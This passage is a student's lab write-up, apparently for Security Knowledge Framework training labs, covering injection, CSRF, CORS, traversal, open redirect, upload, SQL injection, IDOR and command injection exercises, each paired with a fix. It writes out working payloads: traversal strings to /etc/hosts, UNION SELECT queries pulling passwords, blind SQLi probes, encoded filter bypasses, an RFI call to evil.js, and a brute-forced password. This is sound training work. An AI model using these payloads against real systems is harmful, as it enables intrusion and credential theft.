+</ol><h2 id="CSS-Injection" data-id="CSS-Injection"><a class="anchor hidden-xs" href="#CSS-Injection" title="CSS-Injection"><span class="octicon octicon-link"></span></a><span>CSS Injection</span></h2><p><span>It is similar to XSS with an attribute, but this time it works with CSS style.</span></p><center>
+<p><img src="https://i.imgur.com/aDa5u9A.png" alt="" loading="lazy"><br>
+<span>Figure 14 - Web page</span></p>
+</center><p><span>So let’s try to close the style tag (</span><strong><span>};</span></strong><span>) and use </span><strong>&lt;script&gt;<span>alert(‘CSSI’)</span>&lt;/script&gt;</strong><span> - </span><strong><span>#fff;}</span>&lt;script&gt;<span>alert(‘CSSI’)</span>&lt;/script&gt;</strong><span> (Figure 15).</span></p><center>
+<p><img src="https://i.imgur.com/k7StpgM.png" alt="" loading="lazy"><br>
+<span>Figure 15 - CSSI</span></p>
+</center><p><span>To fix this, I filtered the input data by adding a command to the server - </span><strong><span>userInput = userInput.replace(/[^a-zA-Z#0-9()]/g, “”);</span></strong><span> (Figure 16).</span></p><center>
+<p><img src="https://i.imgur.com/Y4avZwR.png" alt="" loading="lazy"><br>
+<span>Figure 16 - CSSI is prevented</span></p>
+</center><h2 id="XSSI" data-id="XSSI"><a class="anchor hidden-xs" href="#XSSI" title="XSSI"><span class="octicon octicon-link"></span></a><span>XSSI</span></h2><p><span>This one finally looks different. In the console, it contains a 404 error about loading from localhost:8081 (Figure 17).</span></p><center>
+<p><img src="https://i.imgur.com/zrxGXjV.png" alt="" loading="lazy"><br>
+<span>Figure 17 - Web page</span></p>
+</center><p><span>Let’s create a server for this address with a malicious file </span><strong><span>./script-provider/javascript.js</span></strong><span>. The source code already contains a script for the server. So I just created a script_provider folder with a script that should give me an alert (Figure 18).</span></p><center>
+<p><img src="https://i.imgur.com/5KdnZPb.png" alt="" loading="lazy"><br>
+<span>Figure 18 - XSSI</span></p>
+</center><p><span>In order to avoid this attack, it is necessary to use a black/white list, reliable sources (preferably your own, but not localhost). The list of reliable sources should be kept to a minimum.</span></p><h2 id="Cross-site-request-forgery" data-id="Cross-site-request-forgery"><a class="anchor hidden-xs" href="#Cross-site-request-forgery" title="Cross-site-request-forgery"><span class="octicon octicon-link"></span></a><span>Cross site request forgery</span></h2><p><span>This is similar to the first XSS (and I can do it here). The value in the input field after sending will be shown on the page. I checked the POST request and found the session token in the cookie (Figure 19).</span></p><center>
+<p><img src="https://i.imgur.com/xfW39kJ.png" alt="" loading="lazy"><br>
+<span>Figure 19 - Cookie</span></p>
+</center><p><span>This value does not change for POST requests. So we can use this to our advantage. I started the evil server from the source code. It will use the session from the cookie to make a POST request with Hackzord!</span></p><p><span>I logged into the web page and sent a Black (Figure 20).</span></p><center>
+<p><img src="https://i.imgur.com/NSZ9W3B.png" alt="" loading="lazy"><br>
+<span>Figure 20 - Black color</span></p>
+</center><p><span>Then I go to the evil server. It executes a second POST request to the web page. Therefore, if I reload the page, I will see another message (Figure 21).</span></p><center>
+<p><img src="https://i.imgur.com/NgDgcf6.png" alt="" loading="lazy"><br>
+<span>Figure 21 - CSRF</span></p>
+</center><p><span>To prevent this attack, CSRF tokens should not be transmitted using cookies. We can use hidden fields, headers, forms, and AJAX calls to do this.</span></p><h2 id="Cross-site-request-forgery-same-site" data-id="Cross-site-request-forgery-same-site"><a class="anchor hidden-xs" href="#Cross-site-request-forgery-same-site" title="Cross-site-request-forgery-same-site"><span class="octicon octicon-link"></span></a><span>Cross site request forgery (same site)</span></h2><p><span>This one contains 3 forms (Figure 22).</span></p><p><img src="https://i.imgur.com/IDRiJFI.png" alt="" loading="lazy"><br>
+<span>Figure 22 - Web page</span></p><p><span>Login Insecure is the previous lab. The evil server uses the saved cookie to perform a POST request.</span></p><p><span>Then I cleared the cookie and tried the same with secure login. And nothing happened, but the evil server still successfully sends a POST request with the same cookies (Figure 23).</span></p><center>
+<p><img src="https://i.imgur.com/pYcgRyW.png" alt="" loading="lazy"><br>
+<span>Figure 23 - POST requests</span></p>
+</center><p><span>That happened because this time cookie was set with samesite=strict. As the cookie was set in Strict mode, the browser was instructed to not send it with any cross-site request. Thus, as Color Change requires an authenticated session, this request is treated as an anonymous one and, therefore, rejected by the application.</span></p><p><span>Login is still Insecure using samesite=lax and it still does not work with a POST request, but it can perform a GET request with the saved cookie (Figure 24).</span></p><center>
+<p><img src="https://i.imgur.com/6iffWRB.png" alt="" loading="lazy"><br>
+<span>Figure 24 - Lax with GET request</span></p>
+</center><p><span>So the samesite=strict is a more secure choice.</span></p><h2 id="Cross-site-request-forgery-weak" data-id="Cross-site-request-forgery-weak"><a class="anchor hidden-xs" href="#Cross-site-request-forgery-weak" title="Cross-site-request-forgery-weak"><span class="octicon octicon-link"></span></a><span>Cross site request forgery weak</span></h2><p><span>Same page. This time it sends not only the color value, but also the csrf_token encoded as base64 (Figure 25).</span></p><center>
+<p><img src="https://i.imgur.com/qWm9RGO.png" alt="" loading="lazy"><br>
+<span>Figure 25 - Request</span></p>
+</center><p><span>It is equal to </span><strong><span>admin09:16</span></strong><span>. It sends it as </span><strong><span>username + hour: minutes</span></strong><span>. This way I can easily get a token. Figure 26 shows a malicious POST request.</span></p><center>
+<p><img src="https://i.imgur.com/0erDskJ.png" alt="" loading="lazy"><br>
+<span>Figure 26 - POST request (admin12:26)</span></p>
+</center><p><span>The content of the web page has been changed to </span><strong><span>Hackzord!</span></strong><span> (Figure 27).</span></p><center>
+<p><img src="https://i.imgur.com/8Gfy8n9.png" alt="" loading="lazy"><br>
+<span>Figure 27 - </span><strong><span>Hackzord!</span></strong></p>
+</center><p><span>To prevent this, we need to provide a stronger token, which is not so easy to guess.</span></p><h2 id="Clickjacking" data-id="Clickjacking"><a class="anchor hidden-xs" href="#Clickjacking" title="Clickjacking"><span class="octicon octicon-link"></span></a><span>Clickjacking</span></h2><p><span>This already has everything we need. It looks like a simple button with some catchy text (Figure 28).</span></p><center>
+<p><img src="https://i.imgur.com/i0Lpalf.png" alt="" loading="lazy"><br>
+<span>Figure 28 - Web page</span></p>
+</center><p><span>But in fact, it contains a transparent iframe in front of it (Figure 29).</span></p><center>
+<p><img src="https://i.imgur.com/tzZjcbF.png" alt="" loading="lazy"><br>
+<span>Figure 29 - iframe</span></p>
+</center><p><span>It can lead to some unintended actions for users or data leaks. In our situation, if we click on show evil, we notice the attacker in reality wants to capture facebook likes behind the “Click me for free stuff!” button.</span></p><p><span>I can’t call it a vulnerability that will be the beginning of an attack. This is more like a post-exploit when an attacker already has access to a web source (CSRF, injection, etc.). Therefore, to prevent this, it is important to protect the web application from other vulnerabilities that can lead to hacking clicks.</span></p><h2 id="Content-security-policy" data-id="Content-security-policy"><a class="anchor hidden-xs" href="#Content-security-policy" title="Content-security-policy"><span class="octicon octicon-link"></span></a><span>Content security policy</span></h2><p><span>During the XSS attacks, I mentioned CSP. This is an HTTP response header that provides a security mechanism to protect against attacks with the introduction of content (XSS). It describes secure resource loading sources and sets rules for using embedded styles, scripts, and dynamic JavaScript evaluation.</span><br>
+<span>Here it is set to </span><strong><span>content-security-policy: script-src ‘</span><a href="http://127.0.0.1" target="_blank" rel="noopener"><span>http://127.0.0.1</span></a><span>’</span></strong><br>
+<span>This lab contains two sections with and without CSP. So let’s see how XSS will work with both of them. The form without CSP allows me to perform XSS (Figure 30).</span></p><center>
+<p><img src="https://i.imgur.com/Oduwynw.png" alt="" loading="lazy"><br>
+<span>Figure 30 - Without CSP</span></p>
+</center><p><span>Form with CSP does not allow me to execute the XSS (Figure 31).</span></p><center>
+<p><img src="https://i.imgur.com/qsWO3Y4.png" alt="" loading="lazy"><br>
+<span>Figure 31 - With CSP</span></p>
+</center><h2 id="CORS-exploitation" data-id="CORS-exploitation"><a class="anchor hidden-xs" href="#CORS-exploitation" title="CORS-exploitation"><span class="octicon octicon-link"></span></a><span>CORS exploitation</span></h2><p><span>This lab has an Access-Control-Allow-Origin (Figure 32).</span></p><center>
+<p><img src="https://i.imgur.com/4xOY2TL.png" alt="" loading="lazy"><br>
+<span>Figure 32 - Access-Control-Allow-Origin</span></p>
+</center><p><span>Access-Control-Allow-Origin is a response header used by a server to indicate which domains are allowed to read the response. But it uses insecure configurations - ‘*’ as the value of the Access-Control-Allow-Origin header which means all domains are allowed. So I am able to send the request to the server and read the response (Figure 33).</span></p><center>
+<p><img src="https://i.imgur.com/08hCfx5.png" alt="" loading="lazy"><br>
+<span>Figure 33 - Confidential data</span></p>
+</center><p><span>To fix this, I need to set the Access-Control-Allow-Origin value correctly.</span></p><h2 id="Path-traversal-LFI" data-id="Path-traversal-LFI"><a class="anchor hidden-xs" href="#Path-traversal-LFI" title="Path-traversal-LFI"><span class="octicon octicon-link"></span></a><span>Path traversal (LFI)</span></h2><p><span>I checked the web page and found that the items in the select element contain a path in the value (Figure 34).</span></p><center>
+<p><img src="https://i.imgur.com/T99nqp2.png" alt="" loading="lazy"><br>
+<span>Figure 34 - Web page</span></p>
+</center><p><span>Let’s change the value to </span><strong><span>…/…/</span></strong><span>. It crashed and gave me information about the error (Figure 35).</span></p><center>
+<p><img src="https://i.imgur.com/HjtdWqh.png" alt="" loading="lazy"><br>
+<span>Figure 35 - Error</span></p>
+</center><p><span>So it takes files from ‘/home/app/LFI/’. Let’s take the value from the hosts file (/etc/hosts). To do this, I need to change the value to </span><strong><span>…/…/…/etc/hosts</span></strong><span> (Figure 36).</span></p><center>
+<p><img src="https://i.imgur.com/B9nUBtu.png" alt="" loading="lazy"><br>
+<span>Figure 36 - </span><strong><span>/etc/hosts</span></strong></p>
+</center><p><span>Here we take data from one folder, so I put </span><strong><span>text/</span></strong><span> in the server part + I deleted the </span><strong><span>/</span></strong><span> from input - </span><strong><span>const filename = ‘text/’ + path.normalize(req.body.filename.split(‘/’).join</span></strong><span> (Figure 37).</span></p><center>
+<p><img src="https://i.imgur.com/epasojZ.png" alt="" loading="lazy"><br>
+<span>Figure 37 - LFI is prevented</span></p>
+</center><p><span>So to prevent it we need to use:</span></p><ol>
+<li><span>Path Prefix Validation</span></li>
+<li><span>Allowlisting</span></li>
+<li><span>Path Concatenation</span></li>
+</ol><h2 id="Local-file-inclusion-harder" data-id="Local-file-inclusion-harder"><a class="anchor hidden-xs" href="#Local-file-inclusion-harder" title="Local-file-inclusion-harder"><span class="octicon octicon-link"></span></a><span>Local file inclusion (harder)</span></h2><p><span>It looks the same, but (Figure 38).</span></p><center>
+<p><img src="https://i.imgur.com/q6uuo20.png" alt="" loading="lazy"><br>
+<span>Figure 38 - Try harder</span></p>
+</center><p><span>It looks like it’s starting to sanitize  some characters. It probably deletes </span><strong><span>…/</span></strong><span>, so let’s change it as </span><strong><span>…/./</span></strong><span>. Then if it deletes </span><strong><span>…/</span></strong><span> from the middle of the input, it will still be </span><strong><span>…/</span></strong><span>. Then I used </span><strong><span>…/./…/./…/./etc/hosts</span></strong><span> and received the data (Figure 39).</span></p><center>
+<p><img src="https://i.imgur.com/etUHxvo.png" alt="" loading="lazy"><br>
+<span>Figure 39 - /etc/hosts</span></p>
+</center><p><span>This can be fixed just like LFI-1.</span></p><h2 id="Local-file-inclusion-hard" data-id="Local-file-inclusion-hard"><a class="anchor hidden-xs" href="#Local-file-inclusion-hard" title="Local-file-inclusion-hard"><span class="octicon octicon-link"></span></a><span>Local file inclusion (hard)</span></h2><p><span>This time it blocks the previous exploit (Figure 40).</span></p><center>
+<p><img src="https://i.imgur.com/DnduCRI.png" alt="" loading="lazy"><br>
+<span>Figure 40 - Try harder</span></p>
+</center><p><span>Now it encodes the input data as a URI. So let’s encrypt </span><strong><span>…/…/…/etc/hosts</span></strong><span>. It does not work because it decodes the payload, so let’s just encrypt it again - </span><strong><span>%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fhosts</span></strong><span> (Figure 41).</span></p><center>
+<p><img src="https://i.imgur.com/wS3rh6P.png" alt="" loading="lazy"><br>
+<span>Figure 41 - LFI</span></p>
+</center><h2 id="Open-redirect" data-id="Open-redirect"><a class="anchor hidden-xs" href="#Open-redirect" title="Open-redirect"><span class="octicon octicon-link"></span></a><span>Open redirect</span></h2><p><span>The web page contains a form with a button. On click, it sends a POST request to the server and follows the link using a GET request (Figure 42).</span></p><center>
+<p><img src="https://i.imgur.com/ItLq2pE.png" alt="" loading="lazy"><br>
+<span>Figure 42 - Web page</span></p>
+</center><p><span>I can exploit it by using the following request </span><strong><a href="https://url-redirection-6d67ef57-4909-4aa6-b385-bff73c383deb.securityknowledgeframework-labs.org/redirect?newurl=https://mail.innopolis.ru" target="_blank" rel="noopener"><span>https://url-redirection-6d67ef57-4909-4aa6-b385-bff73c383deb.securityknowledgeframework-labs.org/redirect?newurl=https://mail.innopolis.ru</span></a></strong><span>.</span></p><p><span>And again reason for this attack is lack of validation. I fixed it with following line </span><strong><span>newurl = newurl.replace(/[^a-zA-Z0-9/]/g, “”)</span></strong><span> (Figure 43).</span></p><center>
+<p><img src="https://i.imgur.com/0Oo0qBX.png" alt="" loading="lazy"><br>
+<span>Figure 43 - Open redirect is prevented</span></p>
+</center><h2 id="Open-redirect--hard-" data-id="Open-redirect--hard-"><a class="anchor hidden-xs" href="#Open-redirect--hard-" title="Open-redirect--hard-"><span class="octicon octicon-link"></span></a><span>Open redirect ( hard )</span></h2><p><span>Well, it looks like it also sanitize the input data (Figure 44).</span></p><center>
+<p><img src="https://i.imgur.com/QecdFwD.png" alt="" loading="lazy"><br>
+<span>Figure 44 - </span><strong><span>. and /</span></strong><span> are banned</span></p>
+</center><p><span>Let’s encode it as URL - </span><strong><span>https:%2F%2Fmail%2Einnopolis%2Eru</span></strong><span>. It does not work, it decodes it as </span><strong><span>https:%2F%</span><a href="http://2Fmail.innopolis.ru" target="_blank" rel="noopener"><span>2Fmail.innopolis.ru</span></a></strong><span>. I encoded it the second time - </span><strong><span>https:%252F%252Fmail%252Einnopolis%252Eru</span></strong><span>. Well, it works, but it gives me a 404 error because it doesn’t decode %</span><strong><span>252F</span></strong><span> as </span><strong><span>/</span></strong><span>. Let’s change them to </span><strong><span>\</span></strong><span> - </span><strong><span>https:\mail%252Einnopolis%252Eru</span></strong><span> (Figure 45).</span></p><center>
+<p><img src="https://i.imgur.com/QlPndxQ.png" alt="" loading="lazy"><br>
+<span>Figure 45 - Open redirect</span></p>
+</center><h2 id="Insecure-File-Upload" data-id="Insecure-File-Upload"><a class="anchor hidden-xs" href="#Insecure-File-Upload" title="Insecure-File-Upload"><span class="octicon octicon-link"></span></a><span>Insecure File Upload</span></h2><p><span>This lab provides an opportunity to upload a file to the server.</span></p><p><span>Let’s see if we can upload a very large file to it. Well, it doesn’t allow uploading a file larger than 5 MB - </span><strong><span>413 Request Entity Too Large</span></strong><span>.</span><br>
+<span>But it works for the local version! When I sent a 5GB file to it, it crashed (Figure 46).</span></p><center>
+<p><img src="https://i.imgur.com/FM5Qnlp.png" alt="" loading="lazy"><br>
+<span>Figure 46 - Server is crashed (DoS)</span></p>
+</center><p><span>Let’s now try to upload some html file - %2E%2E%2Fviews%2Fevil%2Eejs(Figure 47).</span></p><center>
+<p><img src="https://i.imgur.com/8DYafbf.png" alt="" loading="lazy"><br>
+<span>Figure 47 - file uploaded</span></p>
+</center><p><span>But then I can’t access it. But there are two pages - 404 and index so I can replace them with a file - </span><strong><span>%2E%2E%2Fviews%2F404%2Eejs</span></strong><span> (Figure 48).</span></p><center>
+<p><img src="https://i.imgur.com/uiZLVUk.png" alt="" loading="lazy"><br>
+<span>Figure 48 - Replaced 404.ejs</span></p>
+</center><p><span>To prevent this type of attack we need to:</span></p><ol>
+<li><span>Allow only certain file extension</span></li>
+<li><span>Set maximum file size and name length</span></li>
+<li><span>Allow only authorized users</span></li>
+<li><span>Make sure the fetched file from the web is an expected one</span></li>
+<li><span>Keep your website updated</span></li>
+<li><span>Name the files randomly or use a hash instead of user input</span></li>
+<li><span>Block uploads from bots and scripts using captcha</span></li>
+<li><span>Never display the path of the uploaded file</span></li>
+</ol><h2 id="Remote-file-inclusion" data-id="Remote-file-inclusion"><a class="anchor hidden-xs" href="#Remote-file-inclusion" title="Remote-file-inclusion"><span class="octicon octicon-link"></span></a><span>Remote file inclusion</span></h2><p><span>A web page with two choices. We can try to change them to send your malicious file there. To do this, I intercept the POST request and set filename to </span><strong><a href="http://localhost:1337/evil.js" target="_blank" rel="noopener"><span>http://localhost:1337/evil.js</span></a></strong><span>. This leads to the execution of the whoami command (Figure 49).</span></p><center>
+<p><img src="https://i.imgur.com/E5yerAr.png" alt="" loading="lazy"><br>
+<span>Figure 49 - RFI</span></p>
+</center><p><span>To prevent this, I need to use the same methods as for insecure file uploads: verification, sterilization, and whitelisting.</span></p><h2 id="SQLI-union-select" data-id="SQLI-union-select"><a class="anchor hidden-xs" href="#SQLI-union-select" title="SQLI-union-select"><span class="octicon octicon-link"></span></a><span>SQLI (union select)</span></h2><p><span>Let’s perform the union select command (Figure 50).</span></p><center>
+<p><img src="https://i.imgur.com/O36ZXYG.png" alt="" loading="lazy"><br>
+<span>Figure 50 - union select 1</span></p>
+</center><p><span>It returns me an error because of a different number of columns. It seems like there are 3 of them (Figure 51).</span></p><center>
+<p><img src="https://i.imgur.com/47rcGIr.png" alt="" loading="lazy"><br>
+<span>Figure 51 - union select 1,2,3</span></p>
+</center><p><span>Next, I turn to extract data from it (Figure 52).</span></p><center>
+<p><img src="https://i.imgur.com/F3x7eb1.png" alt="" loading="lazy"><br>
+<span>Figure 52 - union select 1,username,password from users</span></p>
+</center><p><span>The main reason for that attack is lack of validation. After adding it (Figure 53) SQLI will not work (Figure 54)</span></p><center>
+<p><img src="https://i.imgur.com/X1TKsOr.png" alt="" loading="lazy"><br>
+<span>Figure 53 - Added validation</span></p>
+<p><img src="https://i.imgur.com/kPaCDtf.png" alt="" loading="lazy"><br>
+<span>Figure 54 - Error</span></p>
+</center><p><span>Another solution that can help with SQLI - the principle of least privileges - having a few instances for different types of operations and usage of predefined construction for a query.</span></p><h2 id="SQLI---like" data-id="SQLI---like"><a class="anchor hidden-xs" href="#SQLI---like" title="SQLI---like"><span class="octicon octicon-link"></span></a><span>SQLI - like</span></h2><p><span>It contains the web page, which shows email and username (Figure 55).</span></p><center>
+<p><img src="https://i.imgur.com/P8kJLvE.png" alt="" loading="lazy"><br>
+<span>Figure 55 - Web page</span></p>
+</center><p><span>It uses the following syntaxis: </span><strong><span>“SELECT UserName, email FROM users WHERE UserName LIKE '%” + username + “%’ ORDER BY UserId”,</span></strong><span>. So to exploit it I need to use </span><strong><span>%25’ request –</span></strong><span>. Let’s perform union select (Figure 56).</span></p><center>
+<p><img src="https://i.imgur.com/UGjOCNC.png" alt="" loading="lazy"><br>
+<span>Figure 56 - Admin%25’ union select 1,2 –</span></p>
+</center><p><span>Now I need to find the name of the table. This is SQLite DB so let’s use internal - sqlite_master. Figure 57 shows the name of the table and its parameters.</span></p><center>
+<p><img src="https://i.imgur.com/IV9p8eh.png" alt="" loading="lazy"><br>
+<span>Figure 57 - users table</span></p>
+</center><p><span>So we can get UserName and Password for Admin as shown in Figure 58.</span></p><center>
+<p><img src="https://i.imgur.com/z19Xbmp.png" alt="" loading="lazy"><br>
+<span>Figure 58 - Admin%25’ union select UserName, Password from users–</span></p>
+</center><p><span>Figure 59 shows the fix.</span></p><center>
+<p><img src="https://i.imgur.com/v6znMG0.png" alt="" loading="lazy"><br>
+<span>Figure 59 - SQLI fixed</span></p>
+</center><p><span>Now SQLI will give a 404 error instead of data as shown in Figure 60.</span></p><center>
+<p><img src="https://i.imgur.com/AGhupOg.png" alt="" loading="lazy"><br>
+<span>Figure 60 - SQLI prevented</span></p>
+</center><h2 id="SQLI---blind" data-id="SQLI---blind"><a class="anchor hidden-xs" href="#SQLI---blind" title="SQLI---blind"><span class="octicon octicon-link"></span></a><span>SQLI - blind</span></h2><p><span>This seems like the first SQLI, but union select does not work here. It works with an injection of a logical operator as shown in Figure 61.</span></p><center>
+<p><img src="https://i.imgur.com/xWAIaUV.png" alt="" loading="lazy"><br>
+<span>Figure 62 - Injection logical operator</span></p>
+</center><p><span>It has SQLI vulnerability. So let’s continue with the logical injection. To see if there is a table called users I used the command </span><strong><span>(select case when tbl_name=‘users’ then 1 else 4 end from sqlite_master where type=‘table’)</span></strong><span>. If there is no error - it exists.</span></p><p><span>To check if there is user called Admin I used </span><strong><span>(select case when substr(UserName,1,5)=‘Admin’ then 1 else 4 end from users limit 0,1)</span></strong><span>.</span><br>
+<span>The third user is Guest - </span><strong><span>(select case when substr(UserName,1,5)=‘Guest’ then 1 else 4 end from users limit 2,3)</span></strong><span>. Then there is plebian - </span><strong><span>(select case when substr(UserName,1,7)=‘Plebian’ then 1 else 4 end from users limit 3,4)</span></strong><span>.</span></p><p><span>So this injection is more complicated because we are not able to see the data but we still can retrieve data from the database.</span></p><p><span>To prevent it I used the same code as for the first SQLI (Figure 63).</span></p><center>
+<p><img src="https://i.imgur.com/u8jIgn2.png" alt="" loading="lazy"><br>
+<span>Figure 63 - Blind SQLI prevented</span></p>
+</center><h2 id="Insecure-direct-object-reference" data-id="Insecure-direct-object-reference"><a class="anchor hidden-xs" href="#Insecure-direct-object-reference" title="Insecure-direct-object-reference"><span class="octicon octicon-link"></span></a><span>Insecure direct object reference</span></h2><p><span>Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more. This is caused by the fact that the application takes user supplied input and uses it to retrieve an object without performing sufficient authorization checks.</span></p><p><span>At this one, I can create a file with content from message input, get the ID of the created file and download it (Figure 64).</span></p><center>
+<p><img src="https://i.imgur.com/2STHqsW.png" alt="" loading="lazy"><br>
+<span>Figure 64 - Web page</span></p>
+</center><p><span>Let’s perform fuzzing to see if we can access any other files (Figure 65).</span></p><center>
+<p><img src="https://i.imgur.com/CcZHHMz.png" alt="" loading="lazy"><br>
+<span>Figure 65 - Bruteforce</span></p>
+</center><p><span>There are two types of response try harder (1308) and error (response with HTML - length 4730). 77 have different lengths (Figures 66 and 67).</span></p><center>
+<p><img src="https://i.imgur.com/kdJOHfa.png" alt="" loading="lazy"><br>
+<span>Figure 66 - Fuzzing result</span></p>
+<p><img src="https://i.imgur.com/fwxI2FJ.png" alt="" loading="lazy"><br>
+<span>Figure 67 - 77 file</span></p>
+</center><p><span>To avoid IDOR following should be performed:</span></p><ol>
+<li><span>Avoid displaying private object references such as keys or file names.</span></li>
+<li><span>Validation.</span></li>
+<li><span>Verification of all the Referenced objects.</span></li>
+<li><span>Tokens should be generated in such a way that it should only be mapped to the user and should not be public.</span></li>
+</ol><h2 id="Right-to-left-override-attack" data-id="Right-to-left-override-attack"><a class="anchor hidden-xs" href="#Right-to-left-override-attack" title="Right-to-left-override-attack"><span class="octicon octicon-link"></span></a><span>Right to left override attack</span></h2><p><span>The right-to-left mark (RLM) is a non-printing character used in the computerized typesetting of bi-directional text containing mixed left-to-right scripts (such as English and Cyrillic) and right-to-left scripts (such as Persian, Arabic, Urdu, Syriac and Hebrew). RLM is used to change the way adjacent characters are grouped with respect to text direction.</span></p><p><span>So for example we can transform our malicious link into something less suspicious as </span><a href="http://example.com/pok3pm.exe" target="_blank" rel="noopener"><span>http://example.com/pok3pm.exe</span></a><span> become </span><a href="http://example.com/pokexe.mp3" target="_blank" rel="noopener"><span>http://example.com/pokexe.mp3</span></a><span> (Figure 68).</span></p><center>
+<p><img src="https://i.imgur.com/QOIlvlt.png" alt="" loading="lazy"><br>
+<span>Figure 68 - RTLO</span></p>
+</center><p><span>It looks like an mp3 file but the browser opens the original link.</span></p><p><span>This attack can be prevented by anti-malware software, but the user can also be trained to check the file extensions and avoid files from an untrusted source.</span></p><h2 id="Rate-limiting" data-id="Rate-limiting"><a class="anchor hidden-xs" href="#Rate-limiting" title="Rate-limiting"><span class="octicon octicon-link"></span></a><span>Rate-limiting</span></h2><p><span>It is the login page. It seems like I need to find the credentials for it. In code, I found metadata (Figure 69).</span></p><center>
+<p><img src="https://i.imgur.com/K0nzEzL.png" alt="" loading="lazy"><br>
+<span>Figure 69 - Web page</span></p>
+</center><p><span>Developer username: devteam</span><br>
+<span>Client: Rockyou</span></p><p><span>So username is devteam. Let’s bruteforce its password. To do this, I downloaded the rockyou.txt dictionary and start bruteforce with burp suite. It found that password is </span><strong><span>manchesterunited</span></strong><span> (Figure 70).</span></p><center>
+<p><img src="https://i.imgur.com/OT7uGoO.png" alt="" loading="lazy"><br>
+<span>Figure 70 - devteam:manchesterunited</span></p>
+</center><p><span>One of the methods to prevent bruteforce and Dos attacks is rate-limiting when after a certain amount of requests we limit the user. It can stop the DoS attack and slow down the bruteforce.</span></p><h2 id="Regex-DDOS" data-id="Regex-DDOS"><a class="anchor hidden-xs" href="#Regex-DDOS" title="Regex-DDOS"><span class="octicon octicon-link"></span></a><span>Regex DDOS</span></h2><p><span>It verifies the email address using regex. If I put a valid email and verify it, the app will show Matched on the screen, otherwise, it will show Not Matched (Figure 71).</span></p><center>
+<p><img src="https://i.imgur.com/mMm83qo.png" alt="" loading="lazy"><br>
+<span>Figure 71 - Web page</span></p>
+</center><p><span>The username may contain letters, numbers, dash, and dot. The domain may contain a dash, number, and letters. But it does not limit the length of the input. let’s see how it can affect the server:</span><br>
+<span>a x5 - 1 ms</span><br>
+<span>a x10 - 2ms</span><br>
+<span>a x20 - 7ms</span><br>
+<span>a x30 - 1872 ms</span><br>
+<span>a x40 - no respond</span></p><p><span>Well, it is DoS attack and it works. To prevent it we need to put a limitation on regex as shown in Figure 72.</span></p><center>
+<p><img src="https://i.imgur.com/juTO0HK.png" alt="" loading="lazy"><br>
+<span>Figure 72 - Prevent Regex DoS</span></p>
+</center><h2 id="Command-injection" data-id="Command-injection"><a class="anchor hidden-xs" href="#Command-injection" title="Command-injection"><span class="octicon octicon-link"></span></a><span>Command injection</span></h2><p><span>The command injection is an attack in which the goal is the execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell.</span></p><p><span>This application does not validate the input, so we can inject a command into it as shown in Figure 73.</span></p><center>
+<p><img src="https://i.imgur.com/FznJ9yR.png" alt="" loading="lazy"><br>
+<span>Figure 73 - Command injection</span></p>
+</center><p><span>To prevent it I added validation (Figure 74).</span></p><center>
+<p><img src="https://i.imgur.com/mzNYkqf.png" alt="" loading="lazy"><br>
+<span>Figure 74 - validation</span></p>
+</center><p><span>To prevent Command injection following may be used:</span></p><ol>
+<li><span>Avoid system calls and user input.</span></li>
+<li><span>Set up input validation.</span></li>
+<li><span>Create a white list—of possible inputs.</span></li>
+<li><span>Use only secure APIs.</span></li>
+<li><span>Use execFile() securely.</span></li>
+</ol><h2 id="Command-injection--easy-" data-id="Command-injection--easy-"><a class="anchor hidden-xs" href="#Command-injection--easy-" title="Command-injection--easy-"><span class="octicon octicon-link"></span></a><span>Command injection ( easy )</span></h2><p><span>Log compressing tool sends value log_type=access during executing if I change it. It changes the name of the file (Figure 75).</span></p><center>
+<p><img src="https://i.imgur.com/WVh5WdU.png" alt="" loading="lazy"><br>
+<span>Figure 75 - Name changed to ab</span></p>
+</center><p><span>So I may try to inject a command to the name. To do this I change the value of access to </span><strong><span>whoami</span></strong><span> (Figure 76).</span></p><center>
+<p><img src="https://i.imgur.com/4K43YMm.png" alt="" loading="lazy"><br>
+<span>Figure 76 - Command injection to the name of the file</span></p>
+</center><p><span>To fix it we can limit input to values </span><strong><span>access</span></strong><span> and </span><strong><span>error</span></strong><span> (Figures 77 and 78).</span></p><center>
+<p><img src="https://i.imgur.com/UAPaC7T.png" alt="" loading="lazy"><br>
+<span>Figure 77 - limitation</span></p>
+<p><img src="https://i.imgur.com/xycd97I.png" alt="" loading="lazy"><br>
+<span>Figure 78 - Error</span></p>
+</center><h2 id="Command-injection--harder-" data-id="Command-injection--harder-"><a class="anchor hidden-xs" href="#Command-injection--harder-" title="Command-injection--harder-"><span class="octicon octicon-link"></span></a><span>Command injection ( harder )</span></h2><p><span>This web app provides info about files (Figure 79).</span></p><center>
+<p><img src="https://i.imgur.com/KFh3krA.png" alt="" loading="lazy"><br>
+<span>Figure 79 - Web page</span></p>
+</center><p><span>I can use this information to replace the index.html and execute some commands in malicious HTML files (Figures 80 and 81).</span></p><center>
+<p><img src="https://i.imgur.com/RWF30Pc.png" alt="" loading="lazy"><br>
+<span>Figure 80 - Uploading malicious file</span></p>
+<p><img src="https://i.imgur.com/Xl2UpcR.png" alt="" loading="lazy"><br>
+<span>Figure 81 - /etc/passwd</span></p>
+</center><h2 id="Information-disclosure-1" data-id="Information-disclosure-1"><a class="anchor hidden-xs" href="#Information-disclosure-1" title="Information-disclosure-1"><span class="octicon octicon-link"></span></a><span>Information disclosure 1</span></h2><p><span>Login page with credentials in comments (Figure 82).</span></p><center>
+<p><img src="https://i.imgur.com/qqyE6Ek.png" alt="" loading="lazy"><br>
+<span>Figure 82 - Credentials</span></p>
+</center><p><span>I don’t even know what to say. Right now there are many instruments for scanning sensitive information inside the code. Even GitHub now will tell you that you include sensitive info in your code. Just review your code.</span></p><h2 id="Information-disclosure-2" data-id="Information-disclosure-2"><a class="anchor hidden-xs" href="#Information-disclosure-2" title="Information-disclosure-2"><span class="octicon octicon-link"></span></a><span>Information disclosure 2</span></h2><p><span>The same login page but this time it contains credentials into metadata (head) as shown in Figure 83.</span></p><center>
+<p><img src="https://i.imgur.com/QlG8fpP.png" alt="" loading="lazy"><br>
+<span>Figure 83 - Metadata</span></p>
